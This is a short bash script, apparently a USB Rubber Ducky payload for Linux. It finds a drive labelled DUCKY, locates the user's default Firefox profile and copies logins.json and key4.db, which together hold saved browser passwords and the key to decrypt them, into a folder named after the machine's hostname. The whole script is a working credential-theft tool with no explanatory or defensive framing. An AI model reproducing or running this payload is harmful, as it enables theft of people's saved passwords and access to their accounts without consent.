DUCKY=$(lsblk -o LABEL,MOUNTPOINT | grep "DUCKY" | awk '{print $2}')
COMPUTER_NAME=$(hostname)
GUID=$(cat /proc/sys/kernel/random/uuid | cut -c1-8)
NEWDIR="UserProfile_${COMPUTER_NAME}_${GUID}"

FIREFOX_BASE_PATH=$(
  if [ -d "${HOME}/.mozilla/firefox" ]; then
    echo "${HOME}/.mozilla/firefox"
  elif [ -d "${HOME}/snap/firefox/common/.mozilla/firefox" ]; then
    echo "${HOME}/snap/firefox/common/.mozilla/firefox"
  fi
)

if [ -z "$FIREFOX_BASE_PATH" ]; then
  exit 1
fi

PROFILE_FOLDER=$(ls "$FIREFOX_BASE_PATH" | grep -E '\.default-release$|\.default$' | head -n 1)

if [ -n "$PROFILE_FOLDER" ]; then
  mkdir -p "$DUCKY/$NEWDIR"
  cp -r "$FIREFOX_BASE_PATH/$PROFILE_FOLDER/logins.json" "$FIREFOX_BASE_PATH/$PROFILE_FOLDER/key4.db" "$DUCKY/$NEWDIR"
  echo "Files copied to $DUCKY/$NEWDIR"
else
  echo "No default Firefox profile folder found."
fi